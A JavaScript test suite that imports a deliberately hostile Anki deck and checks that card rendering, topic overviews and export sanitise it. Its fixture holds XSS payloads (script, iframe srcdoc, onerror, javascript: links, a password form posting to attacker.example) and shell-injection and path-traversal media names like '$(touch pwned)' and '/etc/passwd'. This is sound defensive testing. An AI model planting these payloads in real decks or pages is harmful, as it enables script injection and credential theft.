// tools/anki-html-gates.mjs — a shared deck's markup never reaches the page as markup.
//
// Run:  node tools/anki-html-gates.mjs
//
// An .apkg is somebody else's file, and Anki's fields are HTML. Anki 26.09.4 closed
// a hole where a shared deck ran code through an iframe in its editor, and another
// where a crafted media file name ran a command through "Show in Folder". This
// suite imports one hostile deck end to end (the real reader process, the real
// commit into a scratch library) and then renders every string the import wrote
// through the components that draw it:
//
//   - card front / back / extra / extra-front: `CardFace`, the one card renderer;
//   - topic Overviews (stage descriptions carry deck and tag names): the shared
//     markdown chain, the only one that parses raw HTML;
//   - project name, topic titles, resource rows, media rows: checked as stored.
//
// What counts as a hole is decided on the rendered DOM (jsdom), not on strings:
// an element that runs or loads something (script, iframe, form, object, …), an
// `on…` attribute, a `javascript:`/`data:`/`vbscript:` address, or a picture
// that does not come from the app's own media store. Media names are checked
// for what they can reach: nothing is written outside the scratch store and
// every blob is named by its hash.
//
// Deterministic: no model, no network. The fixture is built here.

import { mkdtempSync, readFileSync, readdirSync, rmSync, statSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, relative, resolve, sep } from 'node:path';
import { createRequire } from 'node:module';
import { fileURLToPath, pathToFileURL } from 'node:url';
import { zstdCompressSync } from 'node:zlib';

const require = createRequire(import.meta.url);
const Database = require('better-sqlite3');
const JSZip = require('jszip');
const { JSDOM } = require('jsdom');

const repoRoot = fileURLToPath(new URL('../', import.meta.url));
const scratch = mkdtempSync(join(tmpdir(), 'anki-html-gates-'));
process.env.DB_PATH = join(scratch, 'app.db');
// Media blobs go to a scratch root: a gate must never write into the real library.
// Nested deep, so a name that climbed out of the store (`../../../x`) would
// still land inside `scratch`, where the walk below can see it.
process.env.VAULT_ROOT = join(scratch, 'd1', 'd2', 'd3', 'd4', 'd5', 'vault');
// Removed on every exit, a thrown check included.
process.on('exit', () => { try { rmSync(scratch, { recursive: true, force: true }); } catch { /* best effort */ } });

const B = new URL('../server/', import.meta.url).href;
const { default: db } = await import(B + 'database.js');
const { parseApkg, commitImport, stripAnkiHtml } = await import(B + 'ankiImport.js');

let pass = 0, fail = 0;
const check = (label, cond, extra = '') => {
    if (cond) { pass++; console.log(`  ok    ${label}`); }
    else { fail++; console.log(`  FAIL  ${label}${extra ? ` — ${extra}` : ''}`); }
};

// ---- the hostile deck -------------------------------------------------------

const SEP = '\x1f';
const EVIL = 'https://attacker.example';

// Each field as an Anki field holds it: raw HTML, and the same payloads written
// as ENTITIES, which is how a deck shows code as text (`&lt;script&gt;`) — the
// importer decodes entities into its plain text, so those come out as real `<`.
const PAYLOADS = [
    ['a script element', '<script>alert(1)</script>script field'],
    ['an iframe with a src', `<iframe src="${EVIL}/frame"></iframe>iframe field`],
    ['an iframe with srcdoc', '<iframe srcdoc="<script>alert(1)</script>"></iframe>srcdoc field'],
    ['an onerror attribute', '<img src="nowhere.png" onerror="alert(1)">onerror field'],
    ['an svg onload', '<svg onload="alert(1)"><circle r="1"/></svg>svg field'],
    ['a javascript: link', '<a href="javascript:alert(1)">click me</a> link field'],
    ['a data: link', '<a href="data:text/html,<script>alert(1)</script>">open</a> data field'],
    ['a form', `<form action="${EVIL}/steal"><input name="pw" type="password"><button>Go</button></form>form field`],
    ['object, embed, meta, base, style', `<object data="${EVIL}/x"></object><embed src="${EVIL}/y"><meta http-equiv="refresh" content="0;url=${EVIL}"><base href="${EVIL}/"><style>body{display:none}</style>misc field`],
    ['an entity-encoded script', '&lt;script&gt;alert(1)&lt;/script&gt; encoded script'],
    ['an entity-encoded iframe', '&lt;iframe srcdoc=&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;/iframe&gt; encoded iframe'],
    ['an entity-encoded onerror', '&lt;img src=x onerror=alert(1)&gt; encoded onerror'],
    ['an entity-encoded form', `&lt;form action=&quot;${EVIL}/steal&quot;&gt;&lt;input name=pw&gt;&lt;/form&gt; encoded form`],
    ['numeric entities spelling a tag', '&#60;iframe src=&#34;' + EVIL + '&#34;&#62;&#60;/iframe&#62; numeric iframe'],
    ['markdown a javascript: link', '[click](javascript:alert(1)) md link'],
    ['markdown a remote picture', `![pixel](${EVIL}/pixel.png) md image`],
    ['a tag split by an empty bold', '<scr<b></b>ipt>alert(1)</scr<b></b>ipt> split tag'],
    ['a local picture with a remote srcset', `<img src="/x.png" srcset="${EVIL}/a.png 2x">srcset field`],
];

// Media file names with path separators, shell characters and the delimiters of
// the two syntaxes an export writes them into (`<img src="…">`, `[sound:…]`).
// The importer decodes entities in a name, so a field can spell `]` and `"` as
// `&#93;` and `&quot;`. Each name is only a key into the deck's media map; the
// bytes are a real PNG and an MP3 header.
const BAD_NAMES = [
    '../../../escape;$(touch pwned).png',
    '..\\..\\Windows\\x&calc.png',
    '/etc/passwd`id`.mp3',
    'x.mp3]<img src=y onerror=alert(1)>[sound:z.mp3',
    'q.png" onerror="alert(1)',
    // Entity-shaped once `;` is gone: `x&amp-<hash>.png` in a src decodes to `x&-…`.
    'x&amp;.png',
];
// How each name is written inside a field.
const AS_WRITTEN = BAD_NAMES.map(n => n.replace(/&/g, '&amp;').replace(/]/g, '&#93;')
    .replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;'));
const PNG = Buffer.from(
    'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==',
    'base64',
);
const MP3 = Buffer.concat([Buffer.from([0x49, 0x44, 0x33, 0x04, 0, 0, 0, 0, 0, 0]), Buffer.alloc(64, 0)]);

const DECK = `Evil<iframe srcdoc='<script>alert(1)</script>'></iframe>${SEP}Sub<img src=x onerror=alert(1)>`;
// Tags are space-separated, so a payload with no spaces. Two schemes covering
// every card, so the deck is split by tag and the tag names reach topic Overviews.
const TAG_A = '<svg/onload=alert(1)>';
const TAG_B = '<iframe/src=javascript:alert(1)>';

const notes = [];
let nid = 1;
PAYLOADS.forEach(([, html], i) => {
    notes.push({ id: nid++, mid: 300, did: 7, tags: i % 2 ? TAG_A : TAG_B,
        flds: [`Q${i} ${html}`, `A${i} ${html}`, `X${i} ${html}`, `F${i} ${html}`].join(SEP) });
});
notes.push({ id: nid++, mid: 300, did: 7, tags: TAG_A,
    flds: [`pics <img src="${AS_WRITTEN[0]}"><img src="${AS_WRITTEN[1]}"><img src="${AS_WRITTEN[4]}"><img src="${AS_WRITTEN[5]}">`,
        `clip [sound:${AS_WRITTEN[2]}] and [sound:${AS_WRITTEN[3]}]`, '', ''].join(SEP) });
notes.push({ id: nid++, mid: 301, did: 7, tags: TAG_B,
    flds: [`Cloze {{c1::<iframe src="${EVIL}"></iframe>answer}} and &lt;script&gt;x&lt;/script&gt;`, '<script>alert(1)</script>extra'].join(SEP) });
// Filler past the stage-split threshold (deckStructure.js MIN_SPLIT), so the
// deck and tag names reach the topic Overviews the split writes.
for (let i = 0; i < 70; i++) {
    notes.push({ id: nid++, mid: 300, did: 7, tags: i % 2 ? TAG_A : TAG_B, flds: [`front ${i}`, `back ${i}`, '', ''].join(SEP) });
}

function encodeTemplateConfig(qfmt, afmt) {
    const parts = [];
    const push = (fieldNo, str) => {
        const bytes = Buffer.from(str, 'utf8');
        const len = [];
        let n = bytes.length;
        do { len.push((n & 0x7f) | (n > 0x7f ? 0x80 : 0)); n >>= 7; } while (n > 0);
        parts.push(Buffer.from([(fieldNo << 3) | 2, ...len]), bytes);
    };
    push(1, qfmt);
    push(2, afmt);
    return Buffer.concat(parts);
}

const colPath = join(scratch, 'hostile.sqlite');
{
    const c = new Database(colPath);
    c.exec(`
        CREATE TABLE col (id integer primary key, crt integer, ver integer, models text, decks text, conf text, dconf text, tags text);
        CREATE TABLE notes (id integer primary key, guid text, mid integer, mod integer,
            usn integer, tags text, flds text, sfld text, csum integer, flags integer, data text);
        CREATE TABLE cards (id integer primary key, nid integer, did integer, ord integer,
            mod integer, usn integer, type integer, queue integer, due integer, ivl integer,
            factor integer, reps integer, lapses integer, left integer, odue integer,
            odid integer, flags integer, data text);
        CREATE TABLE notetypes (id integer primary key, name text, mtime_secs integer, usn integer, config blob);
        CREATE TABLE fields (ntid integer, ord integer, name text, config blob);
        CREATE TABLE decks (id integer primary key, name text, mtime_secs integer, usn integer, common blob, kind blob);
        CREATE TABLE templates (ntid integer, ord integer, name text, mtime_secs integer, usn integer, config blob);
    `);
    c.prepare("INSERT INTO col (id, ver, models, decks, conf, dconf, tags) VALUES (1, 18, '', '', '{}', '{}', '{}')").run();
    const insNt = c.prepare('INSERT INTO notetypes (id, name, config) VALUES (?,?,?)');
    const insF = c.prepare('INSERT INTO fields (ntid, ord, name, config) VALUES (?,?,?,?)');
    const insT = c.prepare('INSERT INTO templates (ntid, ord, name, config) VALUES (?,?,?,?)');
    insNt.run(300, 'Basic<script>alert(1)</script>', Buffer.from([0x08, 0x00]));
    ['Front', 'Back', 'Extra', 'Hint'].forEach((f, i) => insF.run(300, i, f, Buffer.from([])));
    // The TEMPLATE is hostile too: its own iframe, script and javascript: link.
    insT.run(300, 0, 'Card 1', encodeTemplateConfig(
        `{{Front}}<div>{{Hint}}</div><iframe src="${EVIL}/tpl"></iframe>`,
        `{{FrontSide}}<hr id=answer>{{Back}}<div>{{Extra}}</div><a href="javascript:alert('{{Back}}')">{{Back}}</a><script>alert(1)</script>`,
    ));
    insNt.run(301, 'Cloze', Buffer.from([0x08, 0x00]));
    ['Text', 'Back Extra'].forEach((f, i) => insF.run(301, i, f, Buffer.from([])));
    const insD = c.prepare('INSERT INTO decks (id, name, common, kind) VALUES (?,?,?,?)');
    insD.run(1, 'Default', Buffer.from([]), Buffer.from([]));
    insD.run(7, DECK, Buffer.from([]), Buffer.from([]));
    const ins = c.prepare('INSERT INTO notes (id, guid, mid, tags, flds, sfld) VALUES (?,?,?,?,?,?)');
    const insC = c.prepare('INSERT INTO cards (id, nid, did, ord, ivl, factor, reps, lapses, due, type, queue) VALUES (?,?,?,0,0,0,0,0,?,0,0)');
    let cid = 1;
    for (const n of notes) {
        ins.run(n.id, `g${n.id}`, n.mid, ` ${n.tags} `, n.flds, n.flds.split(SEP)[0]);
        insC.run(cid++, n.id, n.did, cid);
    }
    c.close();
}

const zip = new JSZip();
zip.file('collection.anki21b', zstdCompressSync(readFileSync(colPath)));
zip.file('media', JSON.stringify(Object.fromEntries(BAD_NAMES.map((n, i) => [i, n]))));
// Distinct bytes per file, so each name is its own blob.
BAD_NAMES.forEach((n, i) => zip.file(String(i), Buffer.concat([/\.mp3/.test(n) ? MP3 : PNG, Buffer.from([i])])));
const apkg = await zip.generateAsync({ type: 'nodebuffer' });

// ---- import -----------------------------------------------------------------

console.log('\n--- the hostile deck imports ---');
const parsed = await parseApkg(apkg);
check('every hostile note became a card', parsed.stats.cards >= PAYLOADS.length + 2, JSON.stringify(parsed.stats));
const { projectId } = commitImport(parsed, { projectName: undefined });
check('the import committed a project', Number.isInteger(Number(projectId)) && Number(projectId) > 0, String(projectId));

const project = db.prepare('SELECT name, description FROM projects WHERE id = ?').get(projectId);
const nodes = db.prepare('SELECT id, title, description FROM nodes WHERE project_id = ?').all(projectId);
const nodeIds = nodes.map(n => n.id);
const inNodes = `(${nodeIds.join(',') || 'NULL'})`;
const cards = db.prepare(`SELECT id, front, back, extra, extra_front, media FROM flashcards WHERE node_id IN ${inNodes}`).all();
const resources = db.prepare(`SELECT title, url FROM resources WHERE node_id IN ${inNodes}`).all();
const mediaRows = db.prepare('SELECT hash, filename, mime FROM media_files WHERE project_id = ?').all(projectId);
check('the cards were written', cards.length >= PAYLOADS.length + 2, String(cards.length));
check('the deck was split, so deck and tag names reached topic Overviews',
    nodes.some(n => /tagged/.test(n.description || '')), JSON.stringify(nodes.map(n => n.description).slice(0, 3)));

// ---- the renderers ----------------------------------------------------------

// The real components, bundled, rendered under a window at the app's own address
// (the picture and link rules ask the page where it is).
const APP = 'http://localhost:3001/';
const page = new JSDOM('<!doctype html><body></body>', { url: APP }).window;
for (const k of ['window', 'document', 'navigator', 'localStorage', 'HTMLElement', 'Node', 'getComputedStyle']) {
    try { globalThis[k] = page[k]; } catch { /* a read-only global stays node's */ }
}
page.matchMedia ??= () => ({ matches: false, addEventListener() {}, removeEventListener() {} });
globalThis.matchMedia = page.matchMedia;

const { build } = await import('esbuild');
const bundle = join(scratch, 'render.mjs');
await build({
    stdin: {
        contents: `
            import React from 'react';
            import { renderToStaticMarkup } from 'react-dom/server';
            import CardFace from './components/CardFace';
            import Markdown from './components/Markdown';
            import { parseCardMedia } from './components/CardMedia';
            export const card = (c, flipped) => renderToStaticMarkup(React.createElement(CardFace, {
                front: c.front, back: c.back, extra: c.extra, extraFront: c.extra_front,
                flipped, media: parseCardMedia(c.media), size: 'review',
            }));
            export const overview = (md) => renderToStaticMarkup(React.createElement(Markdown, { content: md }));
        `,
        resolveDir: join(repoRoot, 'src'),
        loader: 'tsx',
    },
    bundle: true, format: 'esm', platform: 'node', outfile: bundle, logLevel: 'silent',
    // react-dom/server is CommonJS and requires node built-ins.
    banner: { js: "import { createRequire as __cr } from 'node:module'; const require = __cr(import.meta.url);" },
    jsx: 'automatic',
    loader: { '.css': 'empty', '.svg': 'text', '.png': 'dataurl', '.woff2': 'empty', '.woff': 'empty', '.ttf': 'empty' },
    define: {
        'import.meta.env.DEV': 'false', 'import.meta.env.PROD': 'true',
        'import.meta.env.MODE': '"production"', 'import.meta.env.BASE_URL': '"/"',
    },
});
const render = await import(pathToFileURL(bundle).href);

// Things that run, load or submit. `svg` is absent on purpose: the card draws
// its own icons as inline SVG, and an svg's payload is an `on…` attribute or a
// `<script>` child, both caught below.
const ACTIVE = new Set(['script', 'iframe', 'frame', 'frameset', 'object', 'embed', 'form', 'input',
    'textarea', 'select', 'meta', 'base', 'link', 'style', 'portal', 'applet']);
const URL_ATTRS = ['href', 'src', 'action', 'formaction', 'data', 'srcdoc', 'xlink:href', 'poster', 'background'];

/**
 * A picture may load unasked only from this app, and never from an `/api` route
 * other than the media store and the icons (those do work when requested).
 * Written here from the rule, not imported, so a loosened helper fails this.
 */
function inertPicture(src) {
    let u;
    try { u = new URL(src, APP); } catch { return false; }
    if (u.origin !== new URL(APP).origin) return false;
    const path = u.pathname.toLowerCase();
    return !path.startsWith('/api/') || /^\/api\/(media|icon)\//.test(path);
}

/** Every reason this rendered HTML could run, load or send something. */
function holes(html) {
    const found = [];
    const { document } = new JSDOM(`<!doctype html><body>${html}</body>`).window;
    for (const el of document.body.querySelectorAll('*')) {
        const tag = el.tagName.toLowerCase();
        if (ACTIVE.has(tag)) found.push(`<${tag}>`);
        for (const a of el.attributes) {
            const name = a.name.toLowerCase();
            if (name.startsWith('on')) found.push(`<${tag} ${name}>`);
            if (URL_ATTRS.includes(name) || name === 'srcset') {
                const v = a.value.replace(/[\s\u0000-\u001f]/g, '').toLowerCase();
                if (/^(javascript|data|vbscript):/.test(v)) found.push(`<${tag} ${name}="${a.value.slice(0, 40)}">`);
                if (name === 'srcdoc') found.push(`<${tag} srcdoc>`);
            }
        }
        if (tag === 'img' && !inertPicture(el.getAttribute('src') || '')) found.push(`<img src="${(el.getAttribute('src') || '').slice(0, 40)}">`);
        // A browser may load any srcset candidate instead of the src.
        for (const cand of (el.getAttribute('srcset') || '').split(',')) {
            const url = cand.trim().split(/\s+/)[0];
            if (url && !inertPicture(url)) found.push(`<${tag} srcset="${url.slice(0, 40)}">`);
        }
        // A link goes to the web or nowhere: an emptied href (react-markdown's
        // answer to `javascript:`) is inert; anything else is a hole.
        const href = el.getAttribute('href');
        if (tag === 'a' && href && !/^https?:\/\//i.test(href)) found.push(`<a href="${href.slice(0, 40)}">`);
    }
    return found;
}

console.log('\n--- the judge itself ---');
check('the judge flags a remote srcset candidate beside a local src',
    holes(`<img src="/x.png" srcset="/y.png 1x, ${EVIL}/a.png 2x">`).length === 1,
    JSON.stringify(holes(`<img src="/x.png" srcset="/y.png 1x, ${EVIL}/a.png 2x">`)));
check('the judge passes a srcset of the app\'s own pictures',
    holes(`<img src="/api/media/${'a'.repeat(64)}" srcset="/api/media/${'b'.repeat(64)} 2x, /x.png 480w">`).length === 0);

// ---- cards ------------------------------------------------------------------

console.log('\n--- every card renders with no live markup ---');
{
    const bad = [];
    for (const c of cards) {
        for (const flipped of [false, true]) {
            const h = holes(render.card(c, flipped));
            if (h.length) bad.push(`${String(c.front).slice(0, 30)}${flipped ? ' (back)' : ''}: ${h.join(' ')}`);
        }
    }
    check(`no card face (${cards.length} cards, both sides) holds an active element, handler or unsafe address`,
        bad.length === 0, bad.slice(0, 6).join(' | '));

    // Per payload, so a failure says which trick got through.
    for (const [label, html] of PAYLOADS) {
        const i = PAYLOADS.findIndex(p => p[1] === html);
        const c = cards.find(x => String(x.front).startsWith(`Q${i} `));
        if (!c) { check(`${label}: the card exists`, false, 'not imported'); continue; }
        const h = [...holes(render.card(c, false)), ...holes(render.card(c, true))];
        check(`${label}: rendered as text, nothing live`, h.length === 0, h.join(' '));
    }
}

// The legitimate formatting a deck relies on still arrives.
console.log('\n--- ordinary Anki formatting still renders ---');
{
    const fmt = (html) => render.card({ front: stripAnkiHtml(html).text, back: 'b', extra: null, extra_front: null, media: null }, false);
    const dom = (html) => new JSDOM(`<body>${fmt(html)}</body>`).window.document;
    check('bold marks a word inside a sentence', !!dom('a <b>marked</b> word').querySelector('strong, b'));
    check('a line break stays a line break', /a[\s\S]*b/.test(dom('a<br>b').body.textContent) && stripAnkiHtml('a<br>b').text === 'a\nb');
    check('an https link stays a link', !!dom(`<a href="https://example.org/x">read</a>`).querySelector('a[href="https://example.org/x"]'));
    check('inline LaTeX still becomes maths', !!dom('the area is $\\pi r^2$').querySelector('.katex'));
    check('MathJax-style \\( \\) still becomes maths', !!dom('the area is \\(\\pi r^2\\)').querySelector('.katex'));
    check('furigana still becomes ruby', !!dom('好[す]き').querySelector('ruby'));
    check('a list keeps its items as lines', stripAnkiHtml('<ul><li>one</li><li>two</li></ul>').text.split('\n').length === 2);
    check('a deck that writes code as text keeps the code visible',
        /<b>/.test(dom('use &lt;b&gt; for bold').body.textContent),
        JSON.stringify(dom('use &lt;b&gt; for bold').body.textContent));
}

// ---- topics, project, resources ----------------------------------------------

console.log('\n--- names and Overviews from the deck ---');
{
    const bad = [];
    for (const n of nodes) {
        const h = holes(render.overview(n.description || ''));
        if (h.length) bad.push(`${n.title.slice(0, 30)}: ${h.join(' ')}`);
    }
    const ph = holes(render.overview(project.description || ''));
    if (ph.length) bad.push(`project: ${ph.join(' ')}`);
    check('no topic Overview renders an active element, handler or unsafe address', bad.length === 0, bad.slice(0, 4).join(' | '));
    check('every resource the deck links to is http(s)',
        resources.every(r => /^https?:\/\//i.test(r.url)), JSON.stringify(resources.filter(r => !/^https?:\/\//i.test(r.url))));
}

// ---- media names --------------------------------------------------------------

console.log('\n--- media names reach nothing ---');
{
    const vault = resolve(process.env.VAULT_ROOT);
    const walk = (dir) => readdirSync(dir).flatMap(f => {
        const p = join(dir, f);
        return statSync(p).isDirectory() ? walk(p) : [p];
    });
    const written = walk(scratch).filter(p => !p.startsWith(join(scratch, 'app.db')) && p !== colPath && p !== bundle);
    const outside = written.filter(p => !resolve(p).startsWith(vault + sep));
    check('no file was written outside the media store', outside.length === 0, outside.map(p => relative(scratch, p)).join(', '));
    const blobs = written.filter(p => resolve(p).startsWith(vault + sep));
    check('the media was imported', blobs.length >= 2, String(blobs.length));
    check('every stored blob is named by its hash, never by the deck',
        blobs.every(p => /^[a-f0-9]{64}(\.[a-z0-9]+)?$/.test(p.split(/[\\/]/).pop())),
        blobs.map(p => p.split(/[\\/]/).pop()).join(', '));
    check('every media row points at a hash', mediaRows.length === BAD_NAMES.length && mediaRows.every(m => /^[a-f0-9]{64}$/.test(m.hash)),
        JSON.stringify(mediaRows));
    const refs = cards.flatMap(c => { try { const m = JSON.parse(c.media || '{}'); return [...(m.front || []), ...(m.back || [])]; } catch { return []; } });
    check('every hostile name was imported as a reference', refs.length === BAD_NAMES.length && refs.some(r => r.kind === 'audio'),
        JSON.stringify(refs.map(r => [r.kind, r.name])));
    check('every card media reference is a bare hash', refs.every(r => /^[a-f0-9]{64}$/.test(r.hash)), JSON.stringify(refs).slice(0, 200));
}

// ---- the deck goes back out ----------------------------------------------------
//
// An export is the same deck handed to Anki, where card HTML runs. The words are
// escaped by `textToAnkiHtml`; a media NAME is written into `<img src="…">` and
// `[sound:…]` and into the archive's media map, so it must come out as a plain
// file name that cannot close either syntax or name a path.

console.log('\n--- the export carries no markup and no path ---');
{
    const { exportProjectApkg } = await import(B + 'ankiExport.js');
    const { mediaStorage } = await import(B + 'vaultStorage.js');
    const { buffer } = await exportProjectApkg({ db, mediaStorage }, projectId);
    const out = await JSZip.loadAsync(buffer);
    const index = JSON.parse(await out.file('media').async('string'));
    const names = Object.values(index);
    const colFile = join(scratch, 'exported.anki2');
    (await import('node:fs')).writeFileSync(colFile, await out.file('collection.anki2').async('nodebuffer'));
    const col = new Database(colFile, { readonly: true });
    const fields = col.prepare('SELECT flds FROM notes').all().flatMap(r => r.flds.split(SEP));
    col.close();

    check('every hostile picture and clip went out', names.length === BAD_NAMES.length, JSON.stringify(names));
    // Anki's own rule for a media name (no separator, no character a file system
    // or its syntax reserves), plus the shell's quoting characters and the
    // brackets of `[sound:…]`.
    const UNSAFE = /[\\/:*?"<>|[\]`$;\u0000-\u001f]|^\.|^$/;
    const bad = names.filter(n => UNSAFE.test(n));
    check('every exported media name is a plain file name', bad.length === 0, JSON.stringify(bad));

    const soundNames = fields.flatMap(f => [...f.matchAll(/\[sound:([^\]]*)\]/g)].map(m => m[1]));
    const imgNames = [];
    const live = [];
    for (const f of fields) {
        const html = f.replace(/\[sound:[^\]]*\]/g, '');
        const { document } = new JSDOM(`<!doctype html><body>${html}</body>`).window;
        for (const img of document.querySelectorAll('img')) imgNames.push(img.getAttribute('src'));
        const h = holes(html).filter(x => !/^<img src=/.test(x));   // pictures are checked by name below
        if (h.length) live.push(`${f.slice(0, 40)}: ${h.join(' ')}`);
    }
    check('no exported field holds an active element or handler', live.length === 0, live.slice(0, 4).join(' | '));
    check('every [sound:] in a field names a file in the archive',
        soundNames.length >= 2 && soundNames.every(n => names.includes(n)), JSON.stringify(soundNames));
    check('every <img> in a field names a file in the archive',
        imgNames.length >= 3 && imgNames.every(n => names.includes(n)), JSON.stringify(imgNames));

    const { ankiMediaName, exportMediaNamer } = await import(B + 'ankiExport.js');
    // What each imported reference should come out as, and the bytes behind it.
    const refsOut = cards.flatMap(c => { const m = JSON.parse(c.media || '{}'); return [...(m.front || []), ...(m.back || [])]; });
    const expectBytes = new Map(refsOut.map(r => {
        const i = BAD_NAMES.indexOf(r.name);
        return [ankiMediaName(r), Buffer.concat([/\.mp3/.test(r.name) ? MP3 : PNG, Buffer.from([i])])];
    }));
    const wrongBytes = [];
    for (const [key, name] of Object.entries(index)) {
        const file = out.file(key);
        const bytes = file ? await file.async('nodebuffer') : null;
        if (!bytes || !expectBytes.get(name)?.equals(bytes)) wrongBytes.push(`${key} → ${name}: ${bytes ? `${bytes.length} bytes` : 'no entry'}`);
    }
    check('every media map key has its file, holding that deck file\'s bytes', wrongBytes.length === 0, wrongBytes.join(' | '));
    const expectImg = refsOut.filter(r => r.kind !== 'audio').map(ankiMediaName).sort();
    const expectSound = refsOut.filter(r => r.kind === 'audio').map(ankiMediaName).sort();
    check('every imported picture is named in an exported field',
        expectImg.length === 4 && JSON.stringify([...imgNames].sort()) === JSON.stringify(expectImg),
        JSON.stringify({ expectImg, imgNames }));
    check('every imported clip is named in an exported field',
        expectSound.length === 2 && JSON.stringify([...soundNames].sort()) === JSON.stringify(expectSound),
        JSON.stringify({ expectSound, soundNames }));
    const H1 = 'a'.repeat(64), H2 = 'b'.repeat(64);
    for (const plain of ['cat.jpg', 'cat (1).jpg', 'a b.mp3', '猫の写真.png', 'naïve-café_01.webp', "it's.ogg"]) {
        check(`an ordinary name stays as it was: ${plain}`, ankiMediaName({ name: plain, hash: H1 }) === plain, ankiMediaName({ name: plain, hash: H1 }));
    }
    check('a path keeps only its file name, with its extension',
        /^escape\(touch pwned\)-aaaaaaaa\.png$/.test(ankiMediaName({ name: '../../../escape;$(touch pwned).png', hash: H1 })),
        ankiMediaName({ name: '../../../escape;$(touch pwned).png', hash: H1 }));
    check('two names that clean to the same string stay two files',
        ankiMediaName({ name: 'a]b.png', hash: H1 }) !== ankiMediaName({ name: 'a[b.png', hash: H2 }));
    check('a name that is nothing but unsafe characters still gets one',
        /^media-aaaaaaaa$/.test(ankiMediaName({ name: '../[]', hash: H1 })), ankiMediaName({ name: '../[]', hash: H1 }));
    check('a name that is only an extension keeps it (Anki picks a player by it)',
        ankiMediaName({ name: '.mp3', hash: H1 }) === 'media-aaaaaaaa.mp3', ankiMediaName({ name: '.mp3', hash: H1 }));
    const long = ankiMediaName({ name: `${'a'.repeat(105)}😀tail]x.png`, hash: H1 });
    check('a long name is cut between characters, never inside one',
        long.isWellFormed() && long.endsWith('-aaaaaaaa.png') && Buffer.byteLength(long) <= 120, JSON.stringify(long.slice(95)));
    check('a lone surrogate never reaches the media map',
        ankiMediaName({ name: 'a\ud83d.png', hash: H1 }).isWellFormed());
    // Anki shortens a name past 120 UTF-8 bytes on import, orphaning the field's reference.
    const fits = `${'a'.repeat(116)}.png`;
    check('a plain name of exactly 120 bytes stays as it was', ankiMediaName({ name: fits, hash: H1 }) === fits);
    const wide = ankiMediaName({ name: `${'猫'.repeat(60)}.png`, hash: H1 });
    check('a plain name past 120 bytes is shortened, by bytes, keeping hash and extension',
        Buffer.byteLength(wide) <= 120 && wide.isWellFormed() && /^猫+-aaaaaaaa\.png$/.test(wide), `${Buffer.byteLength(wide)} ${wide}`);

    // One export hands each file one name, across every card.
    const nameFor = exportMediaNamer();
    const H3 = '1234567800' + 'c'.repeat(54);
    const n1 = nameFor({ name: 'cat.jpg', hash: H1 });
    const n2 = nameFor({ name: 'cat.jpg', hash: H2 });
    const n3 = nameFor({ name: 'Cat.jpg', hash: H3 });
    check('two decks\' different cat.jpg go out as two files, case-blind',
        n1 === 'cat.jpg' && n2 === 'cat-2.jpg' && n3 === 'Cat-3.jpg', JSON.stringify([n1, n2, n3]));
    check('the same file asked for twice keeps one name', nameFor({ name: 'cat.jpg', hash: H2 }) === 'cat-2.jpg');
    const cleaned = nameFor({ name: 'a?.png', hash: H3 });
    const real = nameFor({ name: 'a-12345678.png', hash: H1 });
    check('a cleaned name never takes a name a deck really used for another file',
        cleaned === 'a-12345678.png' && real === 'a-12345678-2.png', JSON.stringify([cleaned, real]));
}

console.log('\n--- one name, one file, across the whole export ---');
{
    const { exportProjectApkg } = await import(B + 'ankiExport.js');
    const { mediaStorage } = await import(B + 'vaultStorage.js');
    // Two cards whose different pictures share a name (two decks' cat.jpg), and
    // one whose picture has a name but no file.
    // Filler cards: their plain fronts go out unescaped, so each note is found by its text.
    const [a, b, c, d, e, f, g] = cards.filter(x => /^front \d+$/.test(x.front) && (!x.media || x.media === '{}' || x.media === 'null'));
    const [h1, h2] = mediaRows.filter(m => /^image\//.test(m.mime)).map(m => m.hash);
    const set = db.prepare('UPDATE flashcards SET media = ? WHERE id = ?');
    const pic = (card, name, hash) => set.run(JSON.stringify({ front: [{ name, hash, kind: 'image' }], back: [] }), card.id);
    pic(a, 'cat.jpg', h1);
    pic(b, 'cat.jpg', h2);
    set.run(JSON.stringify({ front: [{ name: 'gone.png', kind: 'image' }], back: [] }), c.id);
    // The same with a long extension, and a cleaned name meeting a name a deck really used.
    const cleanedAs = `x-${h1.slice(0, 8)}.jpeg2000`;
    pic(d, 'scan.jpeg2000', h1);
    pic(e, 'scan.jpeg2000', h2);
    pic(f, 'x?.jpeg2000', h1);
    pic(g, cleanedAs, h2);
    const { buffer, stats } = await exportProjectApkg({ db, mediaStorage }, projectId);
    const out = await JSZip.loadAsync(buffer);
    const index = JSON.parse(await out.file('media').async('string'));
    const keyOf = Object.fromEntries(Object.entries(index).map(([k, n]) => [n, k]));
    const colFile = join(scratch, 'exported-2.anki2');
    (await import('node:fs')).writeFileSync(colFile, await out.file('collection.anki2').async('nodebuffer'));
    const col = new Database(colFile, { readonly: true });
    const fronts = col.prepare('SELECT flds FROM notes').all().map(r => r.flds.split(SEP)[0]);
    col.close();
    // Each card's own note, and the bytes behind the picture it names.
    const shown = async (card, hash) => {
        const src = fronts.map(x => x.startsWith(`${card.front}<img src="`) && /<img src="([^"]*)">$/.exec(x)?.[1]).find(Boolean);
        const file = src && keyOf[src] ? await out.file(keyOf[src]).async('nodebuffer') : null;
        return { src, ok: !!file && file.equals(readFileSync(mediaStorage.pathFor(hash))) };
    };
    const cats = [await shown(a, h1), await shown(b, h2)];
    check('two different pictures named cat.jpg go out as two names, each card showing its own',
        // A plain name stays as it was; only the later claimant is numbered.
        JSON.stringify(cats.map(x => x.src).sort()) === JSON.stringify(['cat-2.jpg', 'cat.jpg'])
            && cats.every(x => x.ok), JSON.stringify(cats));
    const scans = [await shown(d, h1), await shown(e, h2), await shown(f, h1), await shown(g, h2)];
    check('colliding .jpeg2000 names keep the extension after the suffix, each card showing its own',
        // Which of a pair is numbered depends on export order, so compare as sets.
        scans.every(x => x.ok) && JSON.stringify(scans.map(x => x.src).sort())
            === JSON.stringify(['scan-2.jpeg2000', 'scan.jpeg2000', `x-${h1.slice(0, 8)}-2.jpeg2000`, cleanedAs].sort()),
        JSON.stringify(scans));
    const { ankiMediaName } = await import(B + 'ankiExport.js');
    check('a name that is only a long extension keeps it',
        ankiMediaName({ name: '.verylongext', hash: '0123456789'.repeat(7) }) === 'media-01234567.verylongext',
        ankiMediaName({ name: '.verylongext', hash: '0123456789'.repeat(7) }));
